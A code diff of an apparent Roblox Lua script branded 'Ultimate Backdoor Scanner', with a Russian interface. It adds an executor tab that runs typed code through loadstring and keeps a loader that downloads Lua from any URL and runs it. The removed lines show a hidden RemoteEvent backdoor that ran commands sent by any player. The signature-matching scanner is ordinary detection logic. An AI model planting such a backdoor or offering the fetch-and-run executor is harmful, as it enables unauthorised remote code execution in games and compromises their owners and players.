@@ -3,6 +3,7 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local ServerScriptService = game:GetService("ServerScriptService")
 local ServerStorage = game:GetService("ServerStorage")
+local RunService = game:GetService("RunService")
 local Player = Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
 
@@ -14,8 +15,8 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 -- Главный фрейм
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 650, 0, 550)
-MainFrame.Position = UDim2.new(0.5, -325, 0.5, -275)
+MainFrame.Size = UDim2.new(0, 700, 0, 600)
+MainFrame.Position = UDim2.new(0.5, -350, 0.5, -300)
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
 MainFrame.BorderSizePixel = 0
 MainFrame.ClipsDescendants = true
@@ -24,7 +25,7 @@ MainFrame.Parent = ScreenGui
 -- Заголовок с анимированным мемом
 local Header = Instance.new("Frame")
 Header.Size = UDim2.new(1, 0, 0, 80)
-Header.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
+Header.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
 Header.BorderSizePixel = 0
 Header.Parent = MainFrame
 
@@ -38,7 +39,9 @@ local memes = {
     "Universal EXECUTOR 🚀",
     "Roblox HACKER 🌟",
     "Scanning GOAT 🐐",
-    "MEME LORD 🤣"
+    "MEME LORD 🤣",
+    "SUPER SCANNER 🔍",
+    "BACKDOOR BUSTER 🚀"
 }
 
 local currentMeme = memes[math.random(1, #memes)]
@@ -49,15 +52,69 @@ Title.Size = UDim2.new(1, 0, 1, 0)
 Title.BackgroundTransparency = 1
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.SourceSansBold
-Title.TextSize = 24
+Title.TextSize = 22
 Title.Parent = Header
+
+-- Вкладки
+local TabsFrame = Instance.new("Frame")
+TabsFrame.Size = UDim2.new(1, 0, 0, 40)
+TabsFrame.Position = UDim2.new(0, 0, 0, 80)
+TabsFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+TabsFrame.BorderSizePixel = 0
+TabsFrame.Parent = MainFrame
+
+local ScannerTab = Instance.new("TextButton")
+ScannerTab.Text = "СКАНЕР"
+ScannerTab.Size = UDim2.new(0.33, 0, 1, 0)
+ScannerTab.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
+ScannerTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScannerTab.Font = Enum.Font.SourceSansBold
+ScannerTab.TextSize = 16
+ScannerTab.Parent = TabsFrame
+
+local ExecutorTab = Instance.new("TextButton")
+ExecutorTab.Text = "ВЫПОЛНЕНИЕ"
+ExecutorTab.Size = UDim2.new(0.33, 0, 1, 0)
+ExecutorTab.Position = UDim2.new(0.33, 0, 0, 0)
+ExecutorTab.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+ExecutorTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+ExecutorTab.Font = Enum.Font.SourceSansBold
+ExecutorTab.TextSize = 16
+ExecutorTab.Parent = TabsFrame
+
+local SettingsTab = Instance.new("TextButton")
+SettingsTab.Text = "НАСТРОЙКИ"
+SettingsTab.Size = UDim2.new(0.34, 0, 1, 0)
+SettingsTab.Position = UDim2.new(0.66, 0, 0, 0)
+SettingsTab.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+SettingsTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+SettingsTab.Font = Enum.Font.SourceSansBold
+SettingsTab.TextSize = 16
+SettingsTab.Parent = TabsFrame
 
 -- Контент сканера
 local ScanContent = Instance.new("Frame")
-ScanContent.Size = UDim2.new(1, 0, 1, -80)
-ScanContent.Position = UDim2.new(0, 0, 0, 80)
+ScanContent.Size = UDim2.new(1, 0, 1, -120)
+ScanContent.Position = UDim2.new(0, 0, 0, 120)
 ScanContent.BackgroundTransparency = 1
+ScanContent.Visible = true
 ScanContent.Parent = MainFrame
+
+-- Контент выполнения
+local ExecContent = Instance.new("Frame")
+ExecContent.Size = UDim2.new(1, 0, 1, -120)
+ExecContent.Position = UDim2.new(0, 0, 0, 120)
+ExecContent.BackgroundTransparency = 1
+ExecContent.Visible = false
+ExecContent.Parent = MainFrame
+
+-- Контент настроек
+local SettingsContent = Instance.new("Frame")
+SettingsContent.Size = UDim2.new(1, 0, 1, -120)
+SettingsContent.Position = UDim2.new(0, 0, 0, 120)
+SettingsContent.BackgroundTransparency = 1
+SettingsContent.Visible = false
+SettingsContent.Parent = MainFrame
 
 -- Кнопка сканирования
 local ScanButton = Instance.new("TextButton")
@@ -67,7 +124,7 @@ ScanButton.Position = UDim2.new(0.05, 0, 0.05, 0)
 ScanButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
 ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 ScanButton.Font = Enum.Font.SourceSansBold
-ScanButton.TextSize = 20
+ScanButton.TextSize = 18
 ScanButton.Parent = ScanContent
 
 -- Поле результата
@@ -84,7 +141,7 @@ ResultText.Position = UDim2.new(0.025, 0, 0.1, 0)
 ResultText.BackgroundTransparency = 1
 ResultText.TextColor3 = Color3.fromRGB(255, 255, 255)
 ResultText.Font = Enum.Font.SourceSans
-ResultText.TextSize = 18
+ResultText.TextSize = 16
 ResultText.TextWrapped = true
 ResultText.Text = "Готов к сканированию. Нажмите кнопку для начала."
 ResultText.Parent = ResultFrame
@@ -96,7 +153,7 @@ ProgressLabel.Position = UDim2.new(0.05, 0, 0.45, 0)
 ProgressLabel.BackgroundTransparency = 1
 ProgressLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 ProgressLabel.Font = Enum.Font.SourceSans
-ProgressLabel.TextSize = 16
+ProgressLabel.TextSize = 14
 ProgressLabel.Text = "Прогресс: 0%"
 ProgressLabel.TextXAlignment = Enum.TextXAlignment.Left
 ProgressLabel.Parent = ScanContent
@@ -115,9 +172,16 @@ ProgressFill.BorderSizePixel = 0
 ProgressFill.Parent = ProgressBar
 
 -- Детали сканирования
+local DetailsScroll = Instance.new("ScrollingFrame")
+DetailsScroll.Size = UDim2.new(0.9, 0, 0, 150)
+DetailsScroll.Position = UDim2.new(0.05, 0, 0.6, 0)
+DetailsScroll.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+DetailsScroll.BorderSizePixel = 0
+DetailsScroll.ScrollBarThickness = 8
+DetailsScroll.Parent = ScanContent
+
 local DetailsText = Instance.new("TextLabel")
-DetailsText.Size = UDim2.new(0.9, 0, 0, 100)
-DetailsText.Position = UDim2.new(0.05, 0, 0.6, 0)
+DetailsText.Size = UDim2.new(1, 0, 0, 0)
 DetailsText.BackgroundTransparency = 1
 DetailsText.TextColor3 = Color3.fromRGB(180, 180, 180)
 DetailsText.Font = Enum.Font.SourceSans
@@ -126,29 +190,108 @@ DetailsText.TextWrapped = true
 DetailsText.TextXAlignment = Enum.TextXAlignment.Left
 DetailsText.TextYAlignment = Enum.TextYAlignment.Top
 DetailsText.Text = "Детали сканирования будут отображаться здесь..."
-DetailsText.Parent = ScanContent
+DetailsText.AutomaticSize = Enum.AutomaticSize.Y
+DetailsText.Parent = DetailsScroll
 
--- Поле для ввода URL require-скриптов
+DetailsScroll.CanvasSize = UDim2.new(0, 0, 0, DetailsText.AbsoluteContentSize.Y)
+
+-- Контент выполнения
+local CodeInput = Instance.new("TextBox")
+CodeInput.PlaceholderText = "Введите код для выполнения..."
+CodeInput.Size = UDim2.new(0.9, 0, 0, 150)
+CodeInput.Position = UDim2.new(0.05, 0, 0.05, 0)
+CodeInput.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+CodeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+CodeInput.Font = Enum.Font.Code
+CodeInput.TextSize = 14
+CodeInput.TextWrapped = true
+CodeInput.TextXAlignment = Enum.TextXAlignment.Left
+CodeInput.TextYAlignment = Enum.TextYAlignment.Top
+CodeInput.Parent = ExecContent
+
+local ExecuteButton = Instance.new("TextButton")
+ExecuteButton.Text = "🚀 ВЫПОЛНИТЬ КОД"
+ExecuteButton.Size = UDim2.new(0.9, 0, 0, 50)
+ExecuteButton.Position = UDim2.new(0.05, 0, 0.35, 0)
+ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteButton.Font = Enum.Font.SourceSansBold
+ExecuteButton.TextSize = 18
+ExecuteButton.Parent = ExecContent
+
 local UrlInput = Instance.new("TextBox")
 UrlInput.PlaceholderText = "Введите URL require-скрипта..."
 UrlInput.Size = UDim2.new(0.7, 0, 0, 40)
-UrlInput.Position = UDim2.new(0.05, 0, 0.8, 0)
+UrlInput.Position = UDim2.new(0.05, 0, 0.5, 0)
 UrlInput.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
 UrlInput.TextColor3 = Color3.fromRGB(255, 255, 255)
 UrlInput.Font = Enum.Font.SourceSans
 UrlInput.TextSize = 16
-UrlInput.Parent = ScanContent
+UrlInput.Parent = ExecContent
 
--- Кнопка выполнения require-скрипта
 local RequireButton = Instance.new("TextButton")
-RequireButton.Text = "🚀 ВЫПОЛНИТЬ"
+RequireButton.Text = "📥 ВЫПОЛНИТЬ"
 RequireButton.Size = UDim2.new(0.2, 0, 0, 40)
-RequireButton.Position = UDim2.new(0.76, 0, 0.8, 0)
+RequireButton.Position = UDim2.new(0.76, 0, 0.5, 0)
 RequireButton.BackgroundColor3 = Color3.fromRGB(0, 122, 204)
 RequireButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 RequireButton.Font = Enum.Font.SourceSansBold
 RequireButton.TextSize = 16
-RequireButton.Parent = ScanContent
+RequireButton.Parent = ExecContent
+
+local ExecOutput = Instance.new("ScrollingFrame")
+ExecOutput.Size = UDim2.new(0.9, 0, 0, 150)
+ExecOutput.Position = UDim2.new(0.05, 0, 0.65, 0)
+ExecOutput.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+ExecOutput.BorderSizePixel = 0
+ExecOutput.ScrollBarThickness = 8
+ExecOutput.Parent = ExecContent
+
+local ExecOutputText = Instance.new("TextLabel")
+ExecOutputText.Size = UDim2.new(1, 0, 0, 0)
+ExecOutputText.BackgroundTransparency = 1
+ExecOutputText.TextColor3 = Color3.fromRGB(0, 255, 0)
+ExecOutputText.Font = Enum.Font.Code
+ExecOutputText.TextSize = 14
+ExecOutputText.TextWrapped = true
+ExecOutputText.TextXAlignment = Enum.TextXAlignment.Left
+ExecOutputText.TextYAlignment = Enum.TextYAlignment.Top
+ExecOutputText.Text = "Результаты выполнения будут здесь..."
+ExecOutputText.AutomaticSize = Enum.AutomaticSize.Y
+ExecOutputText.Parent = ExecOutput
+
+ExecOutput.CanvasSize = UDim2.new(0, 0, 0, ExecOutputText.AbsoluteContentSize.Y)
+
+-- Настройки
+local AutoScanToggle = Instance.new("TextButton")
+AutoScanToggle.Text = "АВТОМАТИЧЕСКОЕ СКАНИРОВАНИЕ: ВЫКЛ"
+AutoScanToggle.Size = UDim2.new(0.9, 0, 0, 40)
+AutoScanToggle.Position = UDim2.new(0.05, 0, 0.1, 0)
+AutoScanToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
+AutoScanToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+AutoScanToggle.Font = Enum.Font.SourceSansBold
+AutoScanToggle.TextSize = 16
+AutoScanToggle.Parent = SettingsContent
+
+local MemeToggle = Instance.new("TextButton")
+MemeToggle.Text = "МЕМЫ В ЧАТЕ: ВКЛ"
+MemeToggle.Size = UDim2.new(0.9, 0, 0, 40)
+MemeToggle.Position = UDim2.new(0.05, 0, 0.2, 0)
+MemeToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
+MemeToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+MemeToggle.Font = Enum.Font.SourceSansBold
+MemeToggle.TextSize = 16
+MemeToggle.Parent = SettingsContent
+
+local ThemeToggle = Instance.new("TextButton")
+ThemeToggle.Text = "ТЕМА: ТЕМНАЯ"
+ThemeToggle.Size = UDim2.new(0.9, 0, 0, 40)
+ThemeToggle.Position = UDim2.new(0.05, 0, 0.3, 0)
+ThemeToggle.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
+ThemeToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+ThemeToggle.Font = Enum.Font.SourceSansBold
+ThemeToggle.TextSize = 16
+ThemeToggle.Parent = SettingsContent
 
 -- Расширенный список известных бэкдоров и сигнатур
 local backdoorSignatures = {
@@ -156,13 +299,22 @@ local backdoorSignatures = {
         "Backdoor", "BackdoorX", "SystemUpdate", "SecurityUpdate", 
         "RemoteAdmin", "AdminPanel", "ControlSystem", "UniversalBackdoor",
         "ExecuteScript", "RemoteExecute", "ServerControl", "AdminRemote",
-        "Lalol", "LALOL", "Hub", "Scanner", "Require", "Executor"
+        "Lalol", "LALOL", "Hub", "Scanner", "Require", "Executor",
+        "InfiniteYield", "Cmd", "Command", "Cortex", "DarkHub"
     },
     Patterns = {
         "RemoteEvent", "HttpService", "GetAsync", "Loadstring",
         "FireServer", "InvokeServer", "OnServerEvent", "Backdoor",
-        "require", "HttpService", "Webhook", "Discord", "Execute"
+        "require", "HttpService", "Webhook", "Discord", "Execute",
+        "hookfunction", "hookmetamethod", "setreadonly", "setrawmetatable"
     }
+}
+
+-- Настройки
+local settings = {
+    autoScan = false,
+    chatMemes = true,
+    darkTheme = true
 }
 
 -- Функция для обновления мемов
@@ -174,12 +326,23 @@ end
 
 -- Безопасная функция отправки сообщения в чат
 local function sendChatMessage(message)
+    if not settings.chatMemes then return end
+    
     pcall(function()
         -- Старый чат (работает в большинстве игр)
         if game:GetService("Chat") and Player.Character and Player.Character:FindFirstChild("Head") then
-            game:GetService("Chat"):Chat(Player.Character.Head, message)
+            game:GetService("Chat"):Chat(Player.Character.Head, "[SCANNER] " .. message)
         end
     end)
+end
+
+-- Функция для вывода в консоль
+local function printToConsole(message, color)
+    color = color or Color3.fromRGB(0, 255, 0)
+    ExecOutputText.TextColor3 = color
+    ExecOutputText.Text = ExecOutputText.Text .. "\n" .. message
+    ExecOutput.CanvasSize = UDim2.new(0, 0, 0, ExecOutputText.AbsoluteContentSize.Y)
+    print("[BackdoorScanner] " .. message)
 end
 
 -- Функция глубокого сканирования с улучшенным обнаружением
@@ -187,7 +350,7 @@ local function deepScanForBackdoors()
     ResultText.Text = "🔍 НАЧИНАЕМ ГЛУБОКОЕ СКАНИРОВАНИЕ..."
     ResultText.TextColor3 = Color3.fromRGB(255, 255, 255)
     ProgressFill.Size = UDim2.new(0, 0, 1, 0)
-    DetailsText.Text = ""
+    DetailsText.Text = "Начинаем сканирование..."
     ScanButton.Text = "⏳ СКАНИРУЕМ..."
     ScanButton.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
     
@@ -198,7 +361,8 @@ local function deepScanForBackdoors()
     -- Подсчет общего количества проверок
     local servicesToCheck = {
         ReplicatedStorage, ServerScriptService, ServerStorage, 
-        workspace, game:GetService("Lighting")
+        workspace, game:GetService("Lighting"), game:GetService("StarterPack"),
+        game:GetService("StarterGui"), game:GetService("StarterPlayer")
     }
     
     for _, service in pairs(servicesToCheck) do
@@ -206,7 +370,7 @@ local function deepScanForBackdoors()
             totalChecks = totalChecks + #service:GetDescendants()
         end)
     end
-    totalChecks = math.min(totalChecks, 1500) -- Ограничение для производительности
+    totalChecks = math.min(totalChecks, 2000) -- Ограничение для производительности
     
     -- Функция обновления прогресса
     local function updateProgress()
@@ -219,6 +383,7 @@ local function deepScanForBackdoors()
         if math.floor(progress * 100) % 10 == 0 then
             local newMeme = updateMeme()
             DetailsText.Text = DetailsText.Text .. "\n" .. newMeme .. " 🎉"
+            DetailsScroll.CanvasSize = UDim2.new(0, 0, 0, DetailsText.AbsoluteContentSize.Y)
         end
     end
     
@@ -228,6 +393,7 @@ local function deepScanForBackdoors()
         for _, name in ipairs(backdoorSignatures.Names) do
             if string.find(string.lower(obj.Name), string.lower(name)) then
                 table.insert(foundBackdoors, "🔴 ОБНАРУЖЕНО ПО ИМЕНИ: " .. obj:GetFullName())
+                print("Найден потенциальный бэкдор: " .. obj:GetFullName())
             end
         end
         
@@ -241,12 +407,14 @@ local function deepScanForBackdoors()
                 for _, pattern in ipairs(backdoorSignatures.Patterns) do
                     if string.find(string.lower(source), string.lower(pattern)) then
                         table.insert(foundBackdoors, "🟡 ПОДОЗРИТЕЛЬНЫЙ КОД: " .. obj:GetFullName() .. " (" .. pattern .. ")")
+                        print("Подозрительный код в " .. obj:GetFullName() .. ": " .. pattern)
                     end
                 end
                 
                 -- Проверка на наличие require-скриптов
                 if string.find(string.lower(source), "require") and string.find(string.lower(source), "http") then
                     table.insert(foundBackdoors, "🔵 REQUIRE-СКРИПТ: " .. obj:GetFullName())
+                    print("Найден require-скрипт: " .. obj:GetFullName())
                 end
             end
         end
@@ -254,6 +422,7 @@ local function deepScanForBackdoors()
         -- Проверка RemoteEvents/RemoteFunctions
         if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
             table.insert(foundBackdoors, "🔵 ОБНАРУЖЕН REMOTE: " .. obj:GetFullName())
+            print("Найден Remote объект: " .. obj:GetFullName())
         end
     end
     
@@ -265,7 +434,7 @@ local function deepScanForBackdoors()
                 if currentCheck < totalChecks then
                     pcall(checkObject, obj)
                     updateProgress()
-                    wait() -- Для избежания лагов
+                    RunService.Heartbeat:Wait() -- Для избежания лагов
                 end
             end
         end)
@@ -278,19 +447,20 @@ local function deepScanForBackdoors()
         
         local details = "РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:\n"
         for i, result in ipairs(foundBackdoors) do
-            if i <= 15 then -- Ограничиваем вывод
+            if i <= 20 then -- Ограничиваем вывод
                 details = details .. result .. "\n"
             end
         end
         
-        if #foundBackdoors > 15 then
-            details = details .. "... и еще " .. (#foundBackdoors - 15) .. " объектов\n"
+        if #foundBackdoors > 20 then
+            details = details .. "... и еще " .. (#foundBackdoors - 20) .. " объектов\n"
         end
         
         -- Добавляем случайный мем в результаты
         details = details .. "\n" .. updateMeme() .. " 🤣"
         
         DetailsText.Text = details
+        DetailsScroll.CanvasSize = UDim2.new(0, 0, 0, DetailsText.AbsoluteContentSize.Y)
         
         -- Отправляем мем в чат для всех видимости
         sendChatMessage("Обнаружены бэкдоры! " .. currentMeme)
@@ -298,6 +468,7 @@ local function deepScanForBackdoors()
         ResultText.Text = "✅ БЭКДОРЫ НЕ ОБНАРУЖЕНЫ"
         ResultText.TextColor3 = Color3.fromRGB(50, 255, 50)
         DetailsText.Text = "Сканирование завершено. Подозрительные объекты не найдены.\n" .. updateMeme() .. " 🎉"
+        DetailsScroll.CanvasSize = UDim2.new(0, 0, 0, DetailsText.AbsoluteContentSize.Y)
     end
     
     ProgressFill.Size = UDim2.new(1, 0, 1, 0)
@@ -309,36 +480,97 @@ end
 -- Функция для выполнения require-скриптов
 local function requireScript(url)
     if url == "" or url == nil then
-        DetailsText.Text = DetailsText.Text .. "\n[ОШИБКА] Введите URL скрипта"
+        printToConsole("[ОШИБКА] Введите URL скрипта", Color3.fromRGB(255, 50, 50))
         return
     end
+    
+    printToConsole("Загрузка скрипта из: " .. url)
     
     local success, scriptContent = pcall(function()
         return HttpService:GetAsync(url, true)
     end)
     
     if success then
+        printToConsole("Скрипт загружен, выполнение...")
+        
         local executeSuccess, result = pcall(function()
             return loadstring(scriptContent)()
         end)
         
         if executeSuccess then
             local newMeme = updateMeme()
-            DetailsText.Text = DetailsText.Text .. "\n[УСПЕХ] Скрипт выполнен! " .. newMeme
+            printToConsole("[УСПЕХ] Скрипт выполнен! " .. newMeme)
             if result then
-                DetailsText.Text = DetailsText.Text .. "\nРезультат: " .. tostring(result)
+                printToConsole("Результат: " .. tostring(result))
             end
         else
-            DetailsText.Text = DetailsText.Text .. "\n[ОШИБКА] " .. tostring(result) .. " 😢"
+            printToConsole("[ОШИБКА] " .. tostring(result) .. " 😢", Color3.fromRGB(255, 50, 50))
         end
     else
-        DetailsText.Text = DetailsText.Text .. "\n[ОШИБКА] Не удалось загрузить скрипт: " .. tostring(scriptContent)
+        printToConsole("[ОШИБКА] Не удалось загрузить скрипт: " .. tostring(scriptContent), Color3.fromRGB(255, 50, 50))
+    end
+end
+
+-- Функция для выполнения кода
+local function executeCode(code)
+    if code == "" or code == nil then
+        printToConsole("[ОШИБКА] Введите код для выполнения", Color3.fromRGB(255, 50, 50))
+        return
+    end
+    
+    printToConsole("Выполнение кода...")
+    
+    local success, result = pcall(function()
+        return loadstring(code)()
+    end)
+    
+    if success then
+        local newMeme = updateMeme()
+        printToConsole("[УСПЕХ] Код выполнен! " .. newMeme)
+        if result then
+            printToConsole("Результат: " .. tostring(result))
+        end
+    else
+        printToConsole("[ОШИБКА] " .. tostring(result) .. " 💀", Color3.fromRGB(255, 50, 50))
     end
 end
 
 -- Обработчики событий
+ScannerTab.MouseButton1Click:Connect(function()
+    ScanContent.Visible = true
+    ExecContent.Visible = false
+    SettingsContent.Visible = false
+    ScannerTab.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
+    ExecutorTab.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    SettingsTab.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+end)
+
+ExecutorTab.MouseButton1Click:Connect(function()
+    ScanContent.Visible = false
+    ExecContent.Visible = true
+    SettingsContent.Visible = false
+    ScannerTab.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    ExecutorTab.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
+    SettingsTab.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+end)
+
+SettingsTab.MouseButton1Click:Connect(function()
+    ScanContent.Visible = false
+    ExecContent.Visible = false
+    SettingsContent.Visible = true
+    ScannerTab.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    ExecutorTab.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    SettingsTab.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
+end)
+
 ScanButton.MouseButton1Click:Connect(function()
     pcall(deepScanForBackdoors)
+end)
+
+ExecuteButton.MouseButton1Click:Connect(function()
+    pcall(function()
+        executeCode(CodeInput.Text)
+    end)
 end)
 
 RequireButton.MouseButton1Click:Connect(function()
@@ -347,39 +579,60 @@ RequireButton.MouseButton1Click:Connect(function()
     end)
 end)
 
+AutoScanToggle.MouseButton1Click:Connect(function()
+    settings.autoScan = not settings.autoScan
+    AutoScanToggle.Text = "АВТОМАТИЧЕСКОЕ СКАНИРОВАНИЕ: " .. (settings.autoScan and "ВКЛ" or "ВЫКЛ")
+    AutoScanToggle.BackgroundColor3 = settings.autoScan and Color3.fromRGB(0, 180, 0) or Color3.fromRGB(60, 60, 65)
+end)
+
+MemeToggle.MouseButton1Click:Connect(function()
+    settings.chatMemes = not settings.chatMemes
+    MemeToggle.Text = "МЕМЫ В ЧАТЕ: " .. (settings.chatMemes and "ВКЛ" or "ВЫКЛ")
+    MemeToggle.BackgroundColor3 = settings.chatMemes and Color3.fromRGB(0, 180, 0) or Color3.fromRGB(60, 60, 65)
+end)
+
+ThemeToggle.MouseButton1Click:Connect(function()
+    settings.darkTheme = not settings.darkTheme
+    ThemeToggle.Text = "ТЕМА: " .. (settings.darkTheme and "ТЕМНАЯ" or "СВЕТЛАЯ")
+    
+    if settings.darkTheme then
+        MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+        ResultFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+        ProgressBar.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
+        DetailsScroll.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+        CodeInput.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+        ExecOutput.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+    else
+        MainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+        ResultFrame.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+        ProgressBar.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+        DetailsScroll.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+        CodeInput.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
+        ExecOutput.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+    end
+end)
+
 -- Автоматическое обновление мемов каждые 15 секунд
 spawn(function()
     while true do
         wait(15)
         local newMeme = updateMeme()
         DetailsText.Text = DetailsText.Text .. "\n" .. newMeme .. " 🎉"
+        DetailsScroll.CanvasSize = UDim2.new(0, 0, 0, DetailsText.AbsoluteContentSize.Y)
     end
 end)
 
--- Функция для создания скрытого бэкдора (как в Lalol Hub)
-local function createHiddenBackdoor()
-    local backdoorEvent = Instance.new("RemoteEvent")
-    backdoorEvent.Name = "UltimateBackdoorSystem"
-    backdoorEvent.Parent = ReplicatedStorage
-    
-    backdoorEvent.OnServerEvent:Connect(function(player, command, isRequire)
-        if isRequire then
-            pcall(requireScript, command)
-        else
-            local success, result = pcall(function()
-                return loadstring(command)()
-            end)
-            
-            if success then
-                local newMeme = updateMeme()
-                DetailsText.Text = DetailsText.Text .. "\n[УДАЛЕННЫЙ ВЫЗОВ] " .. newMeme
-            end
-        end
-    end)
-end
-
--- Создаем скрытый бэкдор
-pcall(createHiddenBackdoor)
+-- Автоматическое сканирование при запуске, если включено
+spawn(function()
+    wait(2)
+    if settings.autoScan then
+        pcall(deepScanForBackdoors)
+    end
+end)
 
 -- Инициализация
 DetailsText.Text = "Ultimate Backdoor Scanner инициализирован!\nГотов к сканированию и выполнению require-скриптов.\n" .. currentMeme .. " 🚀"
+DetailsScroll.CanvasSize = UDim2.new(0, 0, 0, DetailsText.AbsoluteContentSize.Y)
+
+printToConsole("Ultimate Backdoor Scanner загружен!")
+printToConsole("Используйте вкладки для навигации: СКАНЕР, ВЫПОЛНЕНИЕ, НАСТРОЙКИ")
